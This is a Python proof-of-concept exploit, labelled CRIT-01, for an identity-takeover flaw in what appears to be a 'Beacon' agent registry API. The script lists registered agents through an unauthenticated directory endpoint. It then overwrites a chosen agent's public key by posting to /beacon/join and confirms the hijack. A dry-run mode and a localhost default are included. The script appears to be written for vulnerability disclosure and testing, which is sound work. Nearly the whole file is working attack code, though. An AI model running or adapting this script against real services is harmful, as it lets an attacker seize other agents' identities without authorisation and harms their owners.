#!/usr/bin/env python3
"""
PoC: Identity Takeover via Pubkey Re-registration (CRIT-01)

Demonstrates that any unauthenticated client can overwrite an existing
agent's public key via /beacon/join, gaining full control of their identity.

Usage (against testnet only):
    python attack_01_identity_takeover.py --target bcn_abc123456789 --url http://localhost:5000
"""

import argparse
import hashlib
import json
import sys
from urllib.request import Request, urlopen

# Simulate Ed25519 keypair generation (in real attack, use nacl.signing)
def generate_fake_keypair():
    """Generate a fake keypair for demonstration."""
    import os
    fake_privkey = os.urandom(32)
    fake_pubkey = hashlib.sha256(fake_privkey).digest()  # Simplified for PoC
    return fake_privkey.hex(), fake_pubkey.hex()


def get_agent_directory(base_url):
    """Fetch all registered agents — no auth required."""
    url = f"{base_url}/beacon/atlas"
    req = Request(url, headers={"Accept": "application/json"})
    with urlopen(req, timeout=10) as resp:
        return json.loads(resp.read())


def takeover_identity(base_url, target_agent_id, attacker_pubkey):
    """
    Overwrite the target agent's public key with attacker's key.
    
    The /beacon/join endpoint performs an UPSERT — if agent_id already exists,
    it REPLACES the pubkey_hex. No authentication is required.
    """
    url = f"{base_url}/beacon/join"
    payload = json.dumps({
        "agent_id": target_agent_id,
        "pubkey_hex": attacker_pubkey,
        "name": "Totally Legitimate Agent",
    }).encode()

    req = Request(url, data=payload, headers={"Content-Type": "application/json"})
    with urlopen(req, timeout=10) as resp:
        return json.loads(resp.read())


def verify_takeover(base_url, target_agent_id, attacker_pubkey):
    """Verify that the agent's pubkey was successfully overwritten."""
    agents = get_agent_directory(base_url)
    if isinstance(agents, list):
        for agent in agents:
            if agent.get("agent_id") == target_agent_id:
                if agent.get("pubkey_hex") == attacker_pubkey:
                    return True, "TAKEOVER CONFIRMED: pubkey replaced"
                return False, f"Pubkey mismatch: {agent.get('pubkey_hex')}"
    elif isinstance(agents, dict) and "agents" in agents:
        for agent in agents["agents"]:
            if agent.get("agent_id") == target_agent_id:
                if agent.get("pubkey_hex") == attacker_pubkey:
                    return True, "TAKEOVER CONFIRMED: pubkey replaced"
    return False, "Agent not found in directory"


def main():
    parser = argparse.ArgumentParser(description="PoC: Beacon Identity Takeover")
    parser.add_argument("--target", required=True, help="Target agent_id to takeover")
    parser.add_argument("--url", default="http://localhost:5000", help="Beacon API base URL")
    parser.add_argument("--dry-run", action="store_true", help="Only show what would happen")
    args = parser.parse_args()

    print("[*] Generating attacker keypair...")
    priv, pub = generate_fake_keypair()
    print(f"[*] Attacker pubkey: {pub[:16]}...")

    if args.dry_run:
        print(f"\n[DRY RUN] Would POST to {args.url}/beacon/join:")
        print(f"  agent_id: {args.target}")
        print(f"  pubkey_hex: {pub}")
        print(f"\n[!] This would OVERWRITE the target's public key")
        print(f"[!] The attacker would then control agent '{args.target}'")
        return

    print(f"\n[*] Step 1: Fetching agent directory...")
    try:
        agents = get_agent_directory(args.url)
        print(f"[*] Found {len(agents) if isinstance(agents, list) else '?'} agents in directory")
    except Exception as e:
        print(f"[-] Could not fetch directory: {e}")

    print(f"\n[*] Step 2: Overwriting {args.target}'s pubkey...")
    try:
        result = takeover_identity(args.url, args.target, pub)
        print(f"[+] Server response: {result}")
    except Exception as e:
        print(f"[-] Takeover request failed: {e}")
        sys.exit(1)

    print(f"\n[*] Step 3: Verifying takeover...")
    try:
        success, msg = verify_takeover(args.url, args.target, pub)
        if success:
            print(f"[!!!] {msg}")
            print(f"[!!!] Attacker now controls agent '{args.target}'")
        else:
            print(f"[?] {msg}")
    except Exception as e:
        print(f"[-] Verification failed: {e}")


if __name__ == "__main__":
    main()
